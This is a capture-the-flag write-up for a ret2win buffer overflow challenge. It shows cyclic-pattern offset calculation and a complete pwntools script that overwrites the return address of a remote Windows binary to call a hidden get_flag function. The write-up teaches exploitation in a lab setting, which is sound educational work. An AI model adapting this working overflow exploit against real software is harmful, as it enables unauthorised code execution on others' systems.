# vanilla - CTF Writeup

## Challenge Overview
This is a classic ret2win buffer overflow challenge where we need to overwrite the return address to redirect execution to a hidden `get_flag()` function. The challenge runs on a remote server that we connect to and exploit.

## Initial Analysis

The challenge provides a Windows executable (`vanilla.exe`) running on a remote server (port 35542). Using a disassembler like Ghidra or IDA, we can identify:

1. A vulnerable function that reads user input without proper bounds checking
2. A hidden `get_flag()` function at address `0x00401080` that retrieves and prints the flag from the server

## Finding the Offset

To find the exact offset to the return address, we use a cyclic (De Bruijn) pattern:

### Step 1: Generate a cyclic pattern

```python
def generate_cyclic(size):
    uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lowercase = "abcdefghijklmnopqrstuvwxyz"
    digits = "0123456789"

    pattern = []
    for upper in uppercase:
        for lower in lowercase:
            for digit in digits:
                if len(pattern) >= size:
                    return bytes(''.join(pattern[:size]), 'ascii')
                pattern.append(upper)
                pattern.append(lower)
                pattern.append(digit)
    return bytes(''.join(pattern[:size]), 'ascii')

# Generate 100 byte pattern
pattern = generate_cyclic(100)
with open('input.txt', 'wb') as f:
    f.write(pattern)
```

### Step 2: Run the binary locally or test with remote and observe the crash

When the program crashes, the EIP register contains `0x72413772` (which corresponds to part of our cyclic pattern).

### Step 3: Calculate the offset

```python
import struct

def calculate_offset(eip_value, size):
    pattern = generate_cyclic(size)
    search_bytes = struct.pack("<I", eip_value)
    return pattern.find(search_bytes)

offset = calculate_offset(0x72413772, 1000)
print(f"Offset: {offset}")  # Offset to return address
```

## Exploitation

Now that we know the offset, we can craft our payload and send it to the remote server:

```python
from pwn import *
import struct

# Address of get_flag() function
get_flag = struct.pack('<L', 0x00401080)

# Calculate offset (from the cyclic pattern analysis)
offset = calculate_offset(0x72413772, 1000)

# Build the payload
# [padding to reach return address] + [get_flag address] + [padding to fill rest]
data = b'A' * offset + get_flag + b'\xcc' * (500 - offset - 4)

# Connect to remote server
p = remote('challenge_server', 35542)
print(p.recv(2048))
p.send(data)
print(p.recvall())
```

## Complete Exploit Script

```python
#!/usr/bin/python3
from pwn import *
import sys
import struct

def generate_cyclic(size):
    uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lowercase = "abcdefghijklmnopqrstuvwxyz"
    digits = "0123456789"

    pattern = []
    for upper in uppercase:
        for lower in lowercase:
            for digit in digits:
                if len(pattern) >= size:
                    return bytes(''.join(pattern[:size]), 'ascii')
                pattern.append(upper)
                if len(pattern) >= size:
                    return bytes(''.join(pattern[:size]), 'ascii')
                pattern.append(lower)
                if len(pattern) >= size:
                    return bytes(''.join(pattern[:size]), 'ascii')
                pattern.append(digit)
    return bytes(''.join(pattern[:size]), 'ascii')

def calculate_offset(eip_value, size):
    pattern = generate_cyclic(size)
    search_bytes = struct.pack("<I", eip_value)
    return pattern.find(search_bytes)

# buffer overflow exploit that leads to a simple ret2win approach
get_flag = p32(0x00401080)
offset1 = calculate_offset(0x72413772, 1000)

print("offset calculated: " + str(offset1))
data = b'A' * offset1 + get_flag + b"\xcc" * (500 - offset1 - 4)

p = remote(sys.argv[1], 35542)
print(p.recv(2048))
p.send(data)
print(p.recvall())
```

## Getting the Flag

After running the exploit against the remote server:

```bash
python3 soln.py <server_ip>
```

The script will:
1. Connect to the remote server on port 35542
2. Receive the initial prompt from the server
3. Send the crafted payload with the overwritten return address
4. Receive and print the flag from the server

Output:
```
SPARK{s4m3_0lD_b0f_2_g3t_fl4g}
```

## Key Takeaways

1. **Ret2Win**: A simple exploitation technique where we redirect execution to an existing function in the binary
2. **Cyclic Patterns**: Useful for determining exact offsets to important addresses like the return address
3. **Little Endian**: x86 uses little-endian byte ordering, so addresses must be packed accordingly
4. **Stack Layout**: Understanding how the stack is structured (local variables -> saved EBP -> return address) is crucial for exploitation

## Flag
`SPARK{s4m3_0lD_b0f_2_g3t_fl4g}`
